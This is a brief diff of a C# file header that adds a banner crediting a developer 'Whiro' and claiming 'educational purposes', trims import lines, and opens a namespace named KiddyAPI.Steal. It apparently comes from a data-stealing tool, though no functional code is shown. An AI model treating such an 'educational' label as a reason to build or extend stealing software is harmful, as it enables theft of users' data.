@@ -1,9 +1,9 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
+﻿/////////////////////////////////////////////////////////
+//// Developer : Whiro
+//// For for educational purposes
+//////////////////////////////////////////////////////////
+using System;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace KiddyAPI.Steal
 {
